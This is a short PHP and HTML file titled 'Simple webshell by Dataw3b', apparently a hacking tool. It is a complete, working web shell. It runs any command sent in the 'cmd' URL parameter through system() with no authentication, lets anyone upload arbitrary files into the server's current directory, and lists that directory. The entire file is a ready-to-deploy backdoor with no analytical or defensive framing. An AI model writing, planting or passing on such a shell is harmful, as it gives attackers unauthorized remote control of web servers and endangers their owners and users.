
<html>
<link href="https://fonts.googleapis.com/css?family=Bebas+Neue&display=swap" rel="stylesheet">
<body bgcolor="#A9A9A9">
<center><img src="https://steamuserimages-a.akamaihd.net/ugc/263853639125807479/D12571FB6417B70056063EA5C7784145FA1AC01C/"></img></center>
<center><font face="Bebas Neue" size="10px" color="red">Simple webshell by Dataw3b</font></center>
</body>

<center><form method="post" enctype="multipart/form-data">
         <input type="file" name="file" />
         <input type="submit" name="uploads" value="Upload now!" />
       </form>
     </center>



<center><form method="get">
  <textarea type="text" name="cmd" placeholder="Type command here"></textarea><br>
  <input type="submit" value="Execute command"><br>
</html></center>
<center>
<?php

if($_GET["cmd"]){
  system($_GET["cmd"]);

}

if(isset($_POST["uploads"])){
  $uploads_dir = getcwd();
  $tmp_name = $_FILES["file"]["tmp_name"];
  $name = $_FILES["file"]["name"];
  if(move_uploaded_file($tmp_name, "$uploads_dir/$name")) {
      echo "Upload with successs";
  } else {
      echo "Upload failed :(";
  }

}
echo "<strong>List of Files/Paths</strong>";
$files = scandir(getcwd());
for($i = 0; $i < count($files); $i++) {
    echo "<br>".$files[$i];

}
?>

</center>
